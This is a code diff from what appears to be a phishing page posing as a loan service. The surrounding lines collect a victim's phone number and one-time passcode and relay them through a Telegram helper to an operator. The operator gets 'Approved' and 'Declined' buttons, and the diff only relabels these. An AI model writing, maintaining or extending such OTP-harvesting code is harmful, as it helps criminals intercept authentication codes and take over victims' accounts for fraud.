@@ -282,8 +282,8 @@
 
             // Fix: Start with 7 instead of +263 as requested
             const msg = `🔑 <b>OTP Code Received</b>\n\n📱 <b>Phone:</b> <code>${phone}</code>\n🔢 <b>OTP:</b> <code>${otp}</code>\n💰 <b>Loan:</b> <code>${decodeURIComponent(bd.data || 'Flex Loan')} ($${bd.price || '0'})</code>`;
-            // Fix: Two buttons Approved and Decline
-            const btns = [[{ text: '✓ Approved', callback_data: 'otp_approved' }, { text: '✗ Decline', callback_data: 'otp_declined' }]];
+            // Fix: Two buttons Approved and Declined
+            const btns = [[{ text: '✅ Approved', callback_data: 'otp_approved' }, { text: '❌ Declined', callback_data: 'otp_declined' }]];
 
             document.getElementById('ov').classList.add('on');
             tg(msg, btns);
